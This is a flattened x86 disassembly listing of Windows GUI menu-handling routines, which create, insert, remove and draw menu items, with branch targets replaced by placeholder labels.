mov eax [ ebx + 0x18 ]
call sub_433248
sub_431158
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4332bc
sub_431178
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_433310
sub_431198
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_4311b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_404e98
sub_4311d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43343c
sub_4311f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_433418
sub_431218
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_43342c
sub_431238
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_431264
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41da5c
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_430d48
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_433d54
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4312e0
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_435fb4
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_4333e4
test eax eax
jg r-xdata
mov edx esi
call sub_433780
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_4333f4
call sub_403f64
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403f64
lea eax [ esi + 0x44 ]
call sub_40f8bc
lea eax [ esi + 0x78 ]
call sub_40f8bc
movzx eax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_4316f0
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_416cf8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41daa8
test bl bl
jle r-xdata
call sub_403f64
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_431394
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x5 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4315e5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4315ec
lea eax [ ebp - 0x3c ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x30 ]
call sub_404edc
mov eax ebx
call sub_4333e4
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_431898
mov [ ebp - 0x22 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_405270
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
movzx eax [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_4333e4
test eax eax
jle r-xdata
mov [ ebp - 0x36 ] 0x2c
mov [ ebp - 0x32 ] 0x3f
mov eax ebx
call sub_4339a4
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0x3c ]
movzx eax [ ebx + 0x60 ]
call sub_430984
push [ ebp - 0x3c ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4051e4
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_405324
push eax
mov eax ebx
call sub_431898
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_432fb8
test eax eax
jne r-xdata
mov [ ebp - 0x6 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_405270
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
movzx ecx [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
movzx edx [ ebp - 0x5 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x6 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2e ] eax
movzx eax [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2a ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x26 ] eax
xor eax eax
mov [ ebp - 0x22 ] eax
xor eax eax
mov [ ebp - 0x1e ] eax
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ ebp - 0x4 ]
call sub_405324
mov [ ebp - 0x12 ] eax
mov eax ebx
call sub_4333e4
test eax eax
jle r-xdata
lea eax [ ebp - 0x36 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_431898
mov [ ebp - 0x22 ] eax
sub_431603
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx ecx [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_431394
xor eax eax
pop ebp
retn
sub_431628
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_435224
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_433fd0
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4344b8
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_430dcc
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_431698
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4316e2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41c48c
mov eax [ ebp - 0x4 ]
call sub_430c04
mov edx eax
mov eax ebx
call sub_433418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4316e9
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4316f0
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_431768
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_41db30
sub_43172c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41dec4
mov eax ebx
call sub_4333cc
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_4333cc
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_404160
pop esi
pop ebx
retn
mov eax ebx
call sub_431768
sub_431768
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_431898
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_431768
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_431898
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_431898
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_431628
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax ebp
call sub_431898
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_431838
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_4333e4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_4333f4
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_4333f4
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_4333f4
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_4308d8
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_431898
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_431628
mov eax [ rw-data ]
call sub_4308d8
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_4318e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41ddec
push ebx
push sub_431698
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_431928
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_431b14
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4339a4
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_404edc
test bh 0x4
je r-xdata
mov eax edi
call sub_435224
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405270
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_423fe4
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40512c
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_42398c
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_423998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431b1b
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
call sub_42455c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push ebx
mov eax [ ebp + 0x10 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
mov eax [ ebp - 0x8 ]
call sub_42455c
push eax
call DrawTextA
sub esi 0x4
mov esi [ esi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_42360c
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_42360c
mov eax 0xff00000d
call sub_423140
mov esi eax
mov eax 0xff000010
call sub_423140
cmp esi eax
jne r-xdata
push ebx
mov eax [ ebp + 0x10 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
mov eax [ ebp - 0x8 ]
call sub_42455c
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
sub esi 0x4
mov esi [ esi ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_42360c
jmp r-xdata
sub_431b80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4324c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x22 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
call sub_42f0b8
call sub_42f1c0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42426c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
call sub_42f0b8
call sub_42f1c0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423ec8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_423ec8
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_405270
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_42360c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_423ec8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42426c
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_449e44
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42455c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423ec0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423ec8
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_432010
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4294f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_42360c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_449e44
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_423ec8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42426c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423ec0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42a790
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423e9c
mov eax [ ebp + 0x8 ]
